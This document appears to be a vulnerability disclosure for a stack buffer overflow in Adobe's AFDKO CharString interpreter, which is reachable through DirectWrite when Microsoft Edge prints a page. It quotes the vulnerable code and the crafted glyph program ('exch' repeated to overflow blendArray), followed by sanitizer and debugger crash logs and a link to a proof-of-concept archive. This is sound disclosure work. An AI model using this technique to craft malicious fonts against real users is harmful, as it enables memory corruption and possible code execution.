@@ -1,0 +1,207 @@
+-----=====[ Background ]=====-----
+
+AFDKO (Adobe Font Development Kit for OpenType) is a set of tools for examining, modifying and building fonts. The core part of this toolset is a font handling library written in C, which provides interfaces for reading and writing Type 1, OpenType, TrueType (to some extent) and several other font formats. While the library existed as early as 2000, it was open-sourced by Adobe in 2014 on GitHub [1, 2], and is still actively developed. The font parsing code can be generally found under afdko/c/public/lib/source/*read/*.c in the project directory tree.
+
+At the time of this writing, based on the available source code, we conclude that AFDKO was originally developed to only process valid, well-formatted font files. It contains very few to no sanity checks of the input data, which makes it susceptible to memory corruption issues (e.g. buffer overflows) and other memory safety problems, if the input file doesn't conform to the format specification.
+
+We have recently discovered that starting with Windows 10 1709 (Fall Creators Update, released in October 2017), Microsoft's DirectWrite library [3] includes parts of AFDKO, and specifically the modules for reading and writing OpenType/CFF fonts (internally called cfr/cfw). The code is reachable through dwrite!AdobeCFF2Snapshot, called by methods of the FontInstancer class, called by dwrite!DWriteFontFace::CreateInstancedStream and dwrite!DWriteFactory::CreateInstancedStream. This strongly indicates that the code is used for instancing the relatively new variable fonts [4], i.e. building a single instance of a variable font with a specific set of attributes. The CreateInstancedStream method is not a member of a public COM interface, but we have found that it is called by d2d1!dxc::TextConvertor::InstanceFontResources, which led us to find out that it can be reached through the Direct2D printing interface. It is unclear if there are other ways to trigger the font instancing functionality.
+
+One example of a client application which uses Direct2D printing is Microsoft Edge. If a user opens a specially crafted website with an embedded OpenType variable font and decides to print it (to PDF, XPS, or another physical or virtual printer), the AFDKO code will execute with the attacker's font file as input. Below is a description of one such security vulnerability in Adobe's library exploitable through the Edge web browser.
+
+-----=====[ Description ]=====-----
+
+The afdko/c/public/lib/source/t2cstr/t2cstr.c file in AFDKO implements the Type 2 CharString interpreter for OpenType fonts. The interpreter stack is represented by the following structure in the t2cCtx object:
+
+--- cut ---
+    70      struct /* Operand stack */
+    71      {
+    72          long cnt;
+    73          float array[CFF2_MAX_OP_STACK];
+    74          unsigned short numRegions;
+    75          long blendCnt;
+    76          abfOpEntry blendArray[CFF2_MAX_OP_STACK];
+    77          abfBlendArg blendArgs[T2_MAX_STEMS];
+    78      } stack;
+--- cut ---
+
+The "cnt" and "array" fields correspond to the regular stack used by all kinds of OpenType fonts. The remaining fields only have a purpose in the handling of the new CFF2 format (variable fonts). Whenever a new value is pushed on the stack, it is written to array[] and optionally blendArray[], as seen in the definition of the PUSH() macro:
+
+--- cut ---
+   153  #define PUSH(v)                                                                                       \
+   154      {                                                                                                 \
+   155          if (h->aux->flags & T2C_IS_CFF2) h->stack.blendArray[h->stack.blendCnt++].value = (float)(v); \
+   156          h->stack.array[h->stack.cnt++] = (float)(v);                                                  \
+   157      }
+--- cut ---
+
+However, the reverse POP() macro only pops a value from the main stack, and doesn't touch blendCnt/blendArray:
+
+--- cut ---
+   152  #define POP() (h->stack.array[--h->stack.cnt])
+--- cut ---
+
+This assymetry creates the following problem: there are CFF instructions such as the arithmetic ones, which take values from the top of the stack, use them as factors in some operation, and push the result back. More formally, they pop N values and push back M values, where N != 0, M != 0, N >= M. After executing such an instruction, the stack index is smaller or equal to its previous value.
+
+Because of this, the interpreter doesn't need to check for stack overflow (use the CHKOFLOW macro), and instead must only check if there are enough input values on the stack (with CHKUFLOW). Examples of such behavior are shown below:
+
+--- cut ---
+  1616                          case tx_abs:
+  1617                              CHKUFLOW(h, 1);
+  1618                              {
+  1619                                  float a = POP();
+  1620                                  PUSH((a < 0.0f) ? -a : a);
+  1621                              }
+  1622                              continue;
+  1623                          case tx_add:
+  1624                              CHKUFLOW(h, 2);
+  1625                              {
+  1626                                  float b = POP();
+  1627                                  float a = POP();
+  1628                                  PUSH(a + b);
+  1629                              }
+  1630                              continue;
+--- cut ---
+
+However, this approach is only valid if the PUSH/POP operations are fully symmetric. In the current state of the code, the execution of each such instruction increments the blendCnt counter without verifying if it goes out-of-bounds. By executing many such instructions in a variable font, it possible to overflow blendArray[] and corrupt the memory after it, including other fields of the t2cCtx object and further data stored on the thread's native stack. This may eventually lead to arbitrary code execution.
+
+-----=====[ Proof of Concept ]=====-----
+
+The proof of concept file includes a specially crafted CharString for glyph "A" of the format:
+
+--- cut ---
+1621139584 134217728 div dup exch exch exch exch exch ...
+--- cut ---
+
+The initial four instructions craft two floats on the stack with a binary representation of 0x41414141. The remaining part of the program is the "exch" instruction repeated 30000 times, which keeps the number of elements on the regular stack at 2 (by just continuously exchanging them), while filling out the t2cCtx.stack.blendArray array with more and more data until it is overflown.
+
+-----=====[ Crash logs ]=====-----
+
+A 64-bit "tx" utility compiled with AddressSanitizer and a custom patch to insert ASAN redzones in between the t2cCtx structure fields crashes with the following report, when run as ./tx -cff poc.otf:
+
+--- cut ---
+=================================================================
+==158130==ERROR: AddressSanitizer: use-after-poison on address 0x7ffc38744c30 at pc 0x000000682b20 bp 0x7ffc3873e950 sp 0x7ffc3873e948
+WRITE of size 4 at 0x7ffc38744c30 thread T0
+    #0 0x682b1f in t2Decode afdko/c/public/lib/source/t2cstr/t2cstr.c:1729:33
+    #1 0x670a5b in t2cParse afdko/c/public/lib/source/t2cstr/t2cstr.c:2591:18
+    #2 0x542960 in readGlyph afdko/c/public/lib/source/cffread/cffread.c:2927:14
+    #3 0x541c32 in cfrIterateGlyphs afdko/c/public/lib/source/cffread/cffread.c:2966:9
+    #4 0x509662 in cfrReadFont afdko/c/tx/source/tx.c:151:18
+    #5 0x508cc3 in doFile afdko/c/tx/source/tx.c:429:17
+    #6 0x506b2e in doSingleFileSet afdko/c/tx/source/tx.c:488:5
+    #7 0x4fc91e in parseArgs afdko/c/tx/source/tx.c:558:17
+    #8 0x4f9470 in main afdko/c/tx/source/tx.c:1631:9
+    #9 0x7fc9e2d372b0 in __libc_start_main
+    #10 0x41e5b9 in _start
+
+Address 0x7ffc38744c30 is located in stack of thread T0 at offset 10512 in frame
+    #0 0x66eb8f in t2cParse afdko/c/public/lib/source/t2cstr/t2cstr.c:2523
+
+  This frame has 2 object(s):
+    [32, 757896) 'h' (line 2524) <== Memory access at offset 10512 is inside this variable
+    [758160, 758376) 'Exception' (line 2586)
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: use-after-poison afdko/c/public/lib/source/t2cstr/t2cstr.c:1729:33 in t2Decode
+Shadow bytes around the buggy address:
+  0x1000070e0930: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000070e0940: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000070e0950: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000070e0960: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000070e0970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x1000070e0980: 00 00 00 00 00 00[f7]f7 f7 f7 f7 f7 f7 f7 f7 f7
+  0x1000070e0990: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+  0x1000070e09a0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+  0x1000070e09b0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+  0x1000070e09c0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+  0x1000070e09d0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==158130==ABORTING
+--- cut ---
+
+The same "tx" program compiled without instrumentation crashes when reaching the end of the stack while still trying to write more data to blendArray. The 0x41414141 values written all over the stack can be seen in gdb's corrupted stack trace listing.
+
+--- cut ---
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004603b4 in t2Decode (h=0x7ffffff60188, offset=23552) at ../../../../../source/t2cstr/t2cstr.c:1730
+1730                                    PUSH(a);
+(gdb) info reg $rax $rsp
+rax            0x7ffffffff008   140737488351240
+rsp            0x7ffffff5fd60   0x7ffffff5fd60
+(gdb) p/x $xmm0
+$1 = {v4_float = {0xc, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x41, 0x41, 0x41, 0x41, 0x0 <repeats 12 times>}, v8_int16 = {0x4141, 0x4141,
+    0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x41414141, 0x0, 0x0, 0x0}, v2_int64 = {0x41414141, 0x0}, uint128 = 0x00000000000000000000000041414141}
+(gdb) where
+#0  0x00000000004603b4 in t2Decode (h=0x7ffffff60188, offset=23552) at ../../../../../source/t2cstr/t2cstr.c:1730
+#1  0x000000000045cb26 in t2cParse (offset=1094795585, endOffset=83566, aux=0x41414141, gid=2, cff2=0x41414141, glyph=0x6fd6e8, mem=0x7150b8)
+    at ../../../../../source/t2cstr/t2cstr.c:2591
+#2  0x0000000041414141 in ?? ()
+#3  0x00000000007150b8 in ?? ()
+#4  0x0000000041414141 in ?? ()
+#5  0x00007fffffffd620 in ?? ()
+#6  0x0000000041414141 in ?? ()
+#7  0xfffffffffffffffc in ?? ()
+#8  0x0000000041414141 in ?? ()
+#9  0x0000000000474840 in ?? () at ../../../../../source/tx_shared/tx_shared.c:4891
+#10 0x0000000041414141 in ?? ()
+(gdb) print h->stack.blendCnt
+$2 = 40551
+--- cut ---
+
+The Microsoft Edge renderer process crashes while trying to dereference a partially overwritten h->aux pointer:
+
+--- cut ---
+(51fc.496c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+DWrite!t2Decode+0x119c:
+00007ffb`29e82710 f60080          test    byte ptr [rax],80h ds:000001d3`41414141=??
+0:038> k
+ # Child-SP          RetAddr           Call Site
+00 0000006a`3df8b9e0 00007ffb`29e84a62 DWrite!t2Decode+0x119c
+01 0000006a`3df8bb20 00007ffb`29e6c103 DWrite!t2cParse+0x28e
+02 0000006a`3df9b480 00007ffb`29e6e3f7 DWrite!readGlyph+0x12b
+03 0000006a`3df9b4f0 00007ffb`29e62272 DWrite!cfrIterateGlyphs+0x37
+04 0000006a`3df9b540 00007ffb`29df157a DWrite!AdobeCFF2Snapshot+0x19a
+05 0000006a`3df9ba40 00007ffb`29df0729 DWrite!FontInstancer::InstanceCffTable+0x212
+06 0000006a`3df9bc20 00007ffb`29df039a DWrite!FontInstancer::CreateInstanceInternal+0x249
+07 0000006a`3df9be40 00007ffb`29dd5a4e DWrite!FontInstancer::CreateInstance+0x192
+08 0000006a`3df9c1a0 00007ffb`34eb61ab DWrite!DWriteFontFace::CreateInstancedStream+0x9e
+09 0000006a`3df9c230 00007ffb`34ea9148 d2d1!dxc::TextConvertor::InstanceFontResources+0x19f
+0a 0000006a`3df9c350 00007ffb`0fb750f4 d2d1!dxc::CXpsPrintControl::Close+0xc8
+0b 0000006a`3df9c3a0 00007ffb`0fb4fcb0 edgehtml!CDXPrintControl::Close+0x44
+0c 0000006a`3df9c3f0 00007ffb`0fb547ad edgehtml!CTemplatePrinter::EndPrintD2D+0x5c
+0d 0000006a`3df9c420 00007ffb`0fa2b515 edgehtml!CPrintManagerTemplatePrinter::endPrint+0x2d
+0e 0000006a`3df9c450 00007ffb`0f689175 edgehtml!CFastDOM::CMSPrintManagerTemplatePrinter::Trampoline_endPrint+0x45
+0f 0000006a`3df9c490 00007ffb`0eb568f1 edgehtml!CFastDOM::CMSPrintManagerTemplatePrinter::Profiler_endPrint+0x25
+--- cut ---
+
+-----=====[ References ]=====-----
+
+[1] https://blog.typekit.com/2014/09/19/new-from-adobe-type-open-sourced-font-development-tools/
+[2] https://github.com/adobe-type-tools/afdko
+[3] https://docs.microsoft.com/en-us/windows/desktop/directwrite/direct-write-portal
+[4] https://medium.com/variable-fonts/https-medium-com-tiro-introducing-opentype-variable-fonts-12ba6cd2369
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47092.zip
